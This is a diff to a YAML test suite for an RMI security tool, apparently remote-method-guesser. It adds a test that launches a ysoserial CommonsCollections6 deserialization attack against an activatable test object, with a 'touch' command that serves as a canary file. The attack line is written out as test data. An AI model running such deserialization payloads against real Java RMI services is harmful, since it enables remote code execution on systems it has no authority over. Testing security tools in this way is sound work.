@@ -38,7 +38,7 @@ tests:
       - rmg
       - serial
       - ${TARGET}
-      - CommonsCollections6 
+      - CommonsCollections6
       - 'touch ${volume-d}/${file}'
       - --signature
       - 'String system(String dummy, String[] dummy2)'
@@ -72,7 +72,7 @@ tests:
       - rmg
       - serial
       - ${TARGET}
-      - CommonsCollections6 
+      - CommonsCollections6
       - 'touch ${volume-d}/${file}'
       - --signature
       - 'void releaseRecord(int recordID, String tableName, Integer remoteHashCode)'
@@ -85,6 +85,39 @@ tests:
       - contains:
           values:
             - java.lang.Integer
+            - Caught ClassNotFoundException
+            - deserialize canary
+            - probably worked
+      - file_exists:
+          cleanup: True
+          files:
+            - '${volume}/${file}'
+
+
+  - title: Gadget Call (Activatable)
+    description: |-
+      'Performs a deserialization attack on the updatePreferences function of the'
+      'activation-test2 object.'
+    groups:
+      - ysoserial
+
+    command:
+      - rmg
+      - serial
+      - ${TARGET-ACT}
+      - CommonsCollections6
+      - 'touch ${volume-d}/${file}'
+      - --signature
+      - 'void updatePreferences(java.util.ArrayList dummy1)'
+      - --bound-name
+      - activation-test2
+      - ${OPTIONS}
+
+    validators:
+      - error: False
+      - contains:
+          values:
+            - java.util.ArrayList
             - Caught ClassNotFoundException
             - deserialize canary
             - probably worked
